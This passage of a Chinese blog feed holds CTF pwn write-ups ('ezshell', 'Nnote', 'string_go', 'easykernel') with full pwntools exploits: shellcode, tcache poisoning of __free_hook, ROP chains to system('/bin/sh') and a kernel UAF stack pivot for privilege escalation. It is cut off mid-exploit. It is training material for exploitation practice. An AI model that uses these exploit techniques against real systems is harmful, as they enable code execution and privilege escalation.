p64(r12) + p64(<span class="number">0x7</span>) + p64(<span class="number">0x0</span>) * <span class="number">2</span></span><br><span class="line">payload2 += p64(mov_rdx_r13_call)</span><br><span class="line">payload2 += p64(pop_rdi_ret) + p64(<span class="number">0x600000</span>)</span><br><span class="line">payload2 += p64(pop_rsi_pop_r15_ret) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload2 += p64(call_mprotect)</span><br><span class="line">payload2 += <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> <span class="comment">#rbp</span></span><br><span class="line">payload2 += p64(shellcode_addr)</span><br><span class="line">payload2 += shellcode</span><br><span class="line"></span><br><span class="line">p.send(payload1.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x90&#x27;</span>))</span><br><span class="line">p.send(payload2.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x90&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ezshell"><a href="#ezshell" class="headerlink" title="ezshell"></a>ezshell</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>这是一道seccomp的题，题目逻辑就是执行输入的0x18字节的shellcode</p><p><img src="https://z3.ax1x.com/2021/12/03/oaW5vj.png"></p><p>用seccomp-tools查看syscall的过滤规则，可以看到只允许<code>read</code>、<code>open</code>、<code>mprotect</code>三个系统调用</p><p><img src="https://z3.ax1x.com/2021/12/03/oaWqaV.png"></p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>题目只能输入0x18字节的shellcode，这肯定是远远不够的，所以我们先用这0x18个字节再执行一次<code>read</code>读入更多的shellcode，这段shellcode就可以用来读flag，把后读入的shellcode放到后面，就能一起执行。但是我们甚至都没有<code>write</code>函数，即使能读flag也无法输出出来。这里我采取的是爆破的方法，对读入内存的flag逐字节爆破，比较内存中的字符与传入的字符，如果相同就陷入死循环，用<code>recv</code>超时来判断是否相同。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x10000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmp_flag_by_byte</span>(<span class="params">p, offset, ch</span>):</span></span><br><span class="line"></span><br><span class="line">    code = asm(</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov rsi, 0x10300</span></span><br><span class="line"><span class="string">        mov dl, byte ptr [rsi+&#123;&#125;]</span></span><br><span class="line"><span class="string">        mov cl, &#123;&#125;</span></span><br><span class="line"><span class="string">        cmp cl, dl</span></span><br><span class="line"><span class="string">        jz loop</span></span><br><span class="line"><span class="string">        xor edi, edi</span></span><br><span class="line"><span class="string">        push SYS_exit</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        loop:</span></span><br><span class="line"><span class="string">        jmp loop</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(offset, ch)</span><br><span class="line">    )</span><br><span class="line">    sh3 = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>))</span><br><span class="line">    sh3 += asm(shellcraft.read(<span class="number">3</span>, mmap + <span class="number">0x300</span>, <span class="number">0x100</span>))</span><br><span class="line">    sh3 += code</span><br><span class="line"></span><br><span class="line">    sh1 = asm(shellcraft.read(<span class="number">0</span>, mmap + <span class="number">0x18</span>, <span class="built_in">len</span>(sh3))).ljust(<span class="number">0x18</span>, <span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;master?\n&#x27;</span>, sh1)</span><br><span class="line"></span><br><span class="line">    p.send(sh3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x30</span>):</span><br><span class="line">    offset = <span class="number">38</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7E</span>+<span class="number">1</span>):</span><br><span class="line">        p = process(<span class="string">&#x27;./ezshell_new&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmp_flag_by_byte(p, offset, ch)</span><br><span class="line">            p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">            flag += <span class="built_in">chr</span>(ch)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;find one byte in flag :&quot;</span>, flag)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;all done: flag is &quot;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Nnote"><a href="#Nnote" class="headerlink" title="Nnote"></a>Nnote</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>题目就是常规的note管理，提供了增删查改。漏洞点在<code>add</code>里面，size可以为0，这样在<code>edit</code>的时候就会造成溢出</p><p><img src="https://z3.ax1x.com/2021/12/03/oaWXPU.png"></p><p><img src="https://z3.ax1x.com/2021/12/03/oaWv24.png"></p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>因为libc是2.31的，所以存在tcache，思路也很简单，如果我们能够溢出到已经在tcache中chunk，并且修改其next指针，就能伪造chunk，从而实现任意地址写，然后把<code>__free_hook</code>指针修改为<code>system</code>的地址，就能getshell。然而我们还需要泄露libc的地址，我们知道unsorted bin中的头尾两个chunk里是有libc地址的，所以只要申请8个0x80的chunk再释放，tcache链被填满之后就会有一个chunk进入到unsorted bin中，这时如果申请size为0的chunk（实际得到的chunk是0x20大小的），就会把unsorted bin的chunk从头部拆分出一个0x20的chunk，因为size为0，所以<code>add</code>中的<code>memset</code>函数不会清空chunk里的内容，这样我们就能读出chunk里的libc的地址。</p><p>另外调试的时候可以利用glibc-all-in-one和patchelf两个工具修改程序的链接库到2.31的版本</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=  <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./Nnote&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>) <span class="comment">#1-8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">    delete(i) <span class="comment">#fill the tcache</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;5.Exit&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1ebc60</span></span><br><span class="line">p.info(<span class="string">&#x27;libc leak &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>) <span class="comment">#size</span></span><br><span class="line"></span><br><span class="line">payload += p64(libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]) <span class="comment">#overwrite next to __free_hook</span></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>) <span class="comment">#2: the fake chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>])) <span class="comment">#overwrite __free_hook to system</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;题目总体比较简单，就挑三道相比没那么简单的题详细讲一下&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://cyyyber.icu/tags/pwn/"/>
    
    <category term="writeup" scheme="http://cyyyber.icu/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑2021pwn-wp</title>
    <link href="http://cyyyber.icu/2021/11/23/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021pwn-wp/"/>
    <id>http://cyyyber.icu/2021/11/23/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021pwn-wp/</id>
    <published>2021-11-22T16:00:00.000Z</published>
    <updated>2021-12-03T11:08:38.530Z</updated>
    
    <content type="html"><![CDATA[<p>虽然没参加，但不影响我写writeup :)</p><p>就看了两道比较感兴趣的题，一道是C++的，一道是内核的。并附带了一些小贴士，防止忘记</p><span id="more"></span><h1 id="string-go"><a href="#string-go" class="headerlink" title="string_go"></a>string_go</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>一道C++的题，调用calc计算输入的表达式，如果为结果为3就调用存在漏洞的函数lative_func</p><p>刚开始看到时候被calc函数绕了好久，其实不用把calc细节看明白，看函数名就能猜出来它的作用了</p><p><img src="https://z3.ax1x.com/2021/12/03/oaRTAK.png"></p><p>lative_func里先输入索引v7，再输入字符串v10，然后将v10中索引为v7的字符修改为新输入到字符并输出，后面是一个明显的memcpy栈溢出</p><p><img src="https://z3.ax1x.com/2021/12/03/oaRHhD.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>因为v7是有符号的int类型，所以可以输入-1向上写，而v10上面存的是v10的长度，所以可以将v10的长度修改成大数，造成栈泄露，然后利用下面栈溢出ROP或者直接one gadget</p><h2 id="小贴士"><a href="#小贴士" class="headerlink" title="小贴士"></a>小贴士</h2><p>调试时使用命令<code>sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code>关闭ASLR方便调试</p><p>利用glibc-all-in-one和patchelf修改程序的链接库，利用ldd查看修改状态</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter /home/cy/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so string_go</span><br><span class="line">patchelf --replace-needed libc.so.6 /home/cy/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so string_go</span><br><span class="line">ldd ./string_go</span><br></pre></td></tr></table></figure><p>利用ROPgadget可以将libc的汇编代码输出，也可以找到字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./libc-2.27.so &gt; rop</span><br><span class="line">ROPgadget --binary ./libc-2.27.so --string &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure><p>利用one_gadget可以直接找到one gadget</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget ./libc-2.27.so</span><br></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=  &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./string_go&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;-1&quot;</span>) <span class="comment">#offset</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>) <span class="comment">#leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>) <span class="comment">#pa</span></span><br><span class="line">p.recv()</span><br><span class="line">leak = p.recv()</span><br><span class="line">libc_base = u64(leak[<span class="number">0xf8</span>:<span class="number">0xf8</span>+<span class="number">8</span>])-<span class="number">0x21bf7</span></span><br><span class="line">canary = u64(leak[<span class="number">0x38</span>:<span class="number">0x38</span>+<span class="number">8</span>])</span><br><span class="line">rop = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+p64(canary)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line"><span class="comment"># rop += p64(libc_base+0x4f3d5) #one gadget</span></span><br><span class="line">rop += p64(libc_base+<span class="number">0x215bf</span>) <span class="comment">#pop rdi, ret</span></span><br><span class="line">rop += p64(libc_base+<span class="number">0x1b3e1a</span>) <span class="comment">#/bin/sh</span></span><br><span class="line">rop += p64(libc_base+<span class="number">0x215c0</span>) <span class="comment">#retn</span></span><br><span class="line">rop += p64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]) <span class="comment">#system</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>其中rop链里在system之前多加了一个ret，是因为在 x86_64的系统里return回glibc函数时需要确保栈是对齐的，这里的ret就起到了占位的作用，具体参考<a href="https://ropemporium.com/guide.html#:~:text=The%20MOVAPS%20issue,a%20push%20instruction.">这里</a></p><h1 id="easykernel"><a href="#easykernel" class="headerlink" title="easykernel"></a>easykernel</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>start.sh如下，开启了smep和kaslr保护</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64  \</span><br><span class="line">-m 64M \</span><br><span class="line">-cpu kvm64,+smep \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd rootfs.img \</span><br><span class="line">-nographic \</span><br><span class="line">-s \</span><br><span class="line">-append &quot;console=ttyS0 kaslr quiet&quot;</span><br></pre></td></tr></table></figure><p>驱动提供了增删改查功能</p><p>增：commond为0x20，最大只能申请0x20的块</p><p><img src="https://z3.ax1x.com/2021/12/03/oaRXjA.png"></p><p>删：command为0x30，free之后没有清零，可以UAF</p><p><img src="https://z3.ax1x.com/2021/12/03/oaRvnI.png"></p><p>改：command为0x50</p><p><img src="https://z3.ax1x.com/2021/12/03/oaWpAf.png"></p><p>查：命令为0x40，最多可以输出0x100的内容，可以用来泄露地址</p><p><img src="https://z3.ax1x.com/2021/12/03/oaWC4S.png"></p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>可以将0x20大小的对象放入freelist后打开一个proc文件，此时创建seq_operations结构体从freelist分配对象，利用uaf泄露seq_operations结构体中的指针，再通过修改seq_operations结构体中的指针从而栈迁移，再构造ROP链进行提权</p><blockquote><p>在可以UAF的时候，利用seq_operations结构体，达到泄露地址或执行代码的目的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct seq_operations &#123;</span><br><span class="line">void * (*start) (struct seq_file *m, loff_t *pos);</span><br><span class="line">void (*stop) (struct seq_file *m, void *v);</span><br><span class="line">void * (*next) (struct seq_file *m, void *v, loff_t *pos);</span><br><span class="line">int (*show) (struct seq_file *m, void *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对proc文件系统进行读取的时候，限制了一次最多读一页，如果超过那么只能多次读取，这样就会增加读取次数从而增加系统调用的次数，影响了效率。所以出现了<code>seq_file</code>的序列文件出现，该功能使得对于读取大文件更加容易。 至于其中更深层次的细节，我这里就不赘述了，总而言之，试图读取proc文件系统中的文件时，会创建一个<code>seq_file</code>结构体，作为这个结构体成员的<code>seq_operations</code>也相应产生。 在打开一个序列文件的时候会调用<code>seq_open</code>，之后读取文件内容时，<code>seq_operations</code>的执行顺序为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start() ==&gt; next() ==&gt; show() ==&gt; ... ==&gt; next() ==&gt; show() ==&gt; stop();</span><br></pre></td></tr></table></figure><p>打开一个proc文件之后，总是第二个0x20的object被分配给<code>seq_operations</code>使用，但是我并没有深究第一个是被谁申请的，也并不清楚这在所有内核版本中是否是通用的情况。</p><p>利用方法：将0x20大小的对象放到freelist后，打开一个proc文件，比如<code>/proc/self/stat</code>，然后通过分配到seq_operations结构体的对象泄露内核地址以及设置好寄存器后修改<code>seq_opeartions-&gt;start</code>为类似<code>xchg eax, esp; ret;</code>的栈迁移gadget，再进行后续的rop提权</p><p>可以进行栈迁移的原因是在即将调用<code>seq_operations-&gt;start()</code>的时候rax寄存器中保存的就是这个函数指针，而<code>xchg eax, esp; ret;</code>会将rsp和rax交换，并只保留低位数据，所以如果事先使用mmap在用户空间分配一个32位的地址空间，其低位与该gadget地址一致，则交换以后rsp指向mmap分配的内存，实现栈迁移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rax : 0xffffffffaf1c4878 ◂— xchg   eax, esp</span><br><span class="line">rsp : 0xffffbb04801ffdb8</span><br><span class="line">(ni)</span><br><span class="line">rax : 0x801ffdb8</span><br><span class="line">rsp : 0xaf1c4878(事先用mmap分配0xaf1c4000的内存空间，则可以将栈迁移到可控内存)</span><br></pre></td></tr></table></figure></blockquote><h2 id="小贴士-1"><a href="#小贴士-1" class="headerlink" title="小贴士"></a>小贴士</h2><p>kerpwn_init函数中的misc结构体可以看到驱动的名字和重写的函数</p><p><img src="https://z3.ax1x.com/2021/12/03/oaWkcj.png"></p><p><img src="https://z3.ax1x.com/2021/12/03/oaWZBq.png"></p><p>调试时可以把init中自动关机的代码注释掉，id设置为0就可以用root权限调试</p><p><img src="https://z3.ax1x.com/2021/12/03/oaWK4U.png" alt="image-20211203001122298"></p><p>设置为root权限后就可以查看驱动的基地址，两个提权用的内核函数地址以及内核基地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lsmod #驱动的基地址</span><br><span class="line">cat /proc/kallsyms | grep prepare_kernel_cred  #prepare_kernel_cred函数地址</span><br><span class="line">cat /proc/kallsyms | grep commit_creds#commit_creds函数地址</span><br><span class="line">cat /proc/kallsyms | grep startup_64 #内核基地址</span><br></pre></td></tr></table></figure><p>ROPgadget得到的gadget常常有一些无关的指令，可以借助机器码提取要用的指令，也可以直接到ida中搜索需要的机器码，常用机器码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c3       : ret;</span><br><span class="line">0f 22 e7 : mov cr4,rdi;</span><br><span class="line">94       : xchg eax, esp;</span><br><span class="line">50       : push rax;</span><br><span class="line">5f       : pop rdi;</span><br><span class="line">5a       : pop rdx;</span><br><span class="line">48 89 c7 : mov rdi,rax</span><br><span class="line">0f 01 f8 : swapgs;</span><br><span class="line">48 cf    : iretq</span><br></pre></td></tr></table></figure><p>ROPgadget得到的gadget里没有iretq，可以通过<code>objdump --section .text -d ./vmlinux|grep iretq</code>找到</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span 